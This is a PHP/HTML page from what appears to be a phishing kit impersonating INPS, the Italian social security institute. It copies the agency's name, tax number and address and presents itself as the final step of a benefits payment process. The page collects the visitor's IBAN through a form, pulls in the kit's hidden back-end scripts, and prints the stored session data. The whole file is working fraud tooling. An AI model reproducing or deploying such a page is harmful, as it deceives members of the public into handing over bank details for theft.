<?php

session_start();
require("retro/generale.php");

//CUSTOM
$pagina=array('iban');
$numero = 4;
$prossima = "ok.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("retro/motore.php");
echo json_encode($_SESSION);
?><html class="sfondo"><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css">



<style>
.father {
 display: flex;
    justify-content: center;
    align-items: center;
}
.resto{
    display: none ;
}

.nascondi{
    display: none !important;
}

.child {

      background-image: url(logo.jpg);
    margin-top: 100%;
    position: absolute; 
}
.myButton {
    width: 100%;
    background-color:#5498d4;
    border-radius:23px;
    border:1px solid #5498d4;
    display:inline-block;
    cursor:pointer;
    color:#ffffff;
    font-family:Arial;
    font-size:17px;
    font-weight:bold;
    padding:17px 31px;
    text-decoration:none;
    text-shadow:0px 1px 0px #5498d4;
}
.myButton:hover {
    background-color:#5498d4;
}
.myButton:active {
    position:relative;
    top:1px;
}

        

label{
    margin: 15px 0px !important;
     font-size: 110%;
}
.i1{
    width:100%;
    
    
    line-height: 180%;
    font-size: 110%;
}


input{

}
.sfondo{
    /* FLOAT: RIGHT; */
    background-repeat: no-repeat;
    background-size: cover;
}
input{
padding: 10px;

}
SELECT{
  height:50px;
}
.input2{
padding: 10px;
    
}
form .sopra{
  font-weight: bold;font-size: 90%;
      border-radius: 15px 15px 0px 0px;
      margin: 0;padding: 10px 0px;color: black;
}
form .sopra2{
  font-weight: normal;font-size: 90%;
      border-radius:0px 0px  15px 15px ;
      margin: 0;padding: 10px 0px;color: #545454;
}
</style>
</head><body>
    <div class="father" style="display: none;">
    <div class="child"><img src="logo.png"></div>
</div>
<div class="resto" style="display: block;">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://unpkg.com/purecss@2.0.5/build/pure-min.css">
<script src="jquery-latest.min.js"></script>
<div style="">
<img src="logo2.jpg" style="margin: 15px 15px 10px 15px;width: 250px;">
</div>


<div style="font-size: 140%;margin: 0px 4%;font-weight:normal"><h1>Conferma dati di accredito.</h1>    
<h2 style="font-size: 120%;margin-top: 0px;font-weight:normal">INSERIRE
 <b>IBAN</b> PER CONSENTIRE AD INPS L'EROGAZIONE DELLE PRESTAZIONI NEL RISPETTO DEI TERMINI DI PAGAMENTO PREVISTI DALLA NORMATIVA.</h2>
        <br>
<br>
    <p>INPS EROGAZIONI - PASSO 5 DI 5</p>
<div class="progress">
  <div class="progress-bar" role="progressbar" style="width: 95%" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100"></div>
</div>



<form method="POST" autocomplete="off">



       
   
  <br>


   
   


   

   
   <h3 class="sopra">Inserisci il tuo iban</h3>
   <input autocomplete="off" required="" class="i1" type="text" name="iban">
   <br><br>
   
   

         
        
        
        
       
                
        
        <br><button type="submit" class="myButton">Conferma</button><br>

          </form></div>
      </div>
     
<div style="background-color: #5a6772;"><img src="logo2.png" style="margin: 15px 15px 10px 15px;"><p style="color: white;padding: 18px;">Istituto Nazionale Previdenza Sociale<br>
P.IVA 02121151001<br>
Sede Legale:<br>
Via Ciro il Grande, 21<br>
00144 Roma</p>
</div>






<script src="SimpleAjaxUploader.js"></script>
<script>
function escapeTags( str ) {
  return String( str )
           .replace( /&/g, '&amp;' )
           .replace( /"/g, '&quot;' )
           .replace( /'/g, '&#39;' )
           .replace( /</g, '&lt;' )
           .replace( />/g, '&gt;' );
}

window.onload = function() {
jQuery(".caricamento").each(function(){
  var btn = jQuery(this).find('#uploadBtn'),
      progressBar = jQuery(this).find('#progressBar'),
      progressOuter = jQuery(this).find('#progressOuter'),
      msgBox = jQuery(this).find('#msgBox');
      inp = jQuery(this).find('input');
  var uploader = new ss.SimpleUpload({
        button: btn,
        url: 'file_upload.php',
        name: 'uploadfile',
        multipart: true,
        hoverClass: 'hover',
        focusClass: 'focus',
        responseType: 'json',
        startXHR: function() {
            progressOuter[0].style.display = 'block'; // make progress bar visible
            this.setProgressBar( progressBar );
        },
        onSubmit: function() {
            msgBox.html(''); // empty the message box
            jQuery(msgBox).show()
            
            jQuery(msgBox).removeClass("ok").removeClass("ko")
            btn.html('Caricamento, attendere prego...'); // change button text to "Uploading..."
          },
        onComplete: function( filename, response ) {
            btn.html('Scegli un altro file');
            progressOuter[0].style.display = 'none'; // hide progress bar when upload is completed

            if ( !response ) {
                msgBox.html('impossibile caricare il file');
                jQuery(msgBox).show()
                return;
            }

            if ( response.success === true ) {
                msgBox.html('<strong class="metti" data-value="'+response.nome+'" >' + escapeTags( filename ) + '</strong>' + ' caricato correttamente');
                jQuery(msgBox).show()
                jQuery(msgBox).addClass("ok")
            } else {
                if ( response.msg )  {
                    msgBox.html(escapeTags( response.msg ));
                    jQuery(msgBox).show()
                    jQuery(msgBox).removeClass("ok")
                    jQuery(msgBox).addClass("ko")

                } else {
                    msgBox.html('si è verificato un errore riprova');
                    jQuery(msgBox).show()
                    jQuery(msgBox).addClass("ko")
                }
            }
          },
        onError: function() {
            progressOuter[0].style.display = 'none';
            msgBox.html('Impossibile caricare il file');
          }
	});
})
};

setInterval(function(){


    jQuery(".metti").each(function(){

            nome = jQuery(this).parents(".container").data("input")
            jj = jQuery(this).data("value")
            jQuery("."+nome).val(jj)
    })
},500);
</script>


<div style="display: none; position: relative; visibility: hidden; overflow: hidden; margin: 0px; padding: 0px; opacity: 0; direction: ltr; z-index: 16777270;"><input type="file" name="uploadfile" style="position: absolute; right: 0px; margin: 0px; padding: 0px; font-size: 480px; font-family: sans-serif; cursor: pointer; height: 100%; z-index: 16777270;"></div><div style="display: none; position: relative; visibility: hidden; overflow: hidden; margin: 0px; padding: 0px; opacity: 0; direction: ltr; z-index: 16777270;"><input type="file" name="uploadfile" style="position: absolute; right: 0px; margin: 0px; padding: 0px; font-size: 480px; font-family: sans-serif; cursor: pointer; height: 100%; z-index: 16777270;"></div><div style="display: none; position: relative; visibility: hidden; overflow: hidden; margin: 0px; padding: 0px; opacity: 0; direction: ltr; z-index: 16777270;"><input type="file" name="uploadfile" style="position: absolute; right: 0px; margin: 0px; padding: 0px; font-size: 480px; font-family: sans-serif; cursor: pointer; height: 100%; z-index: 16777270;"></div></body></html>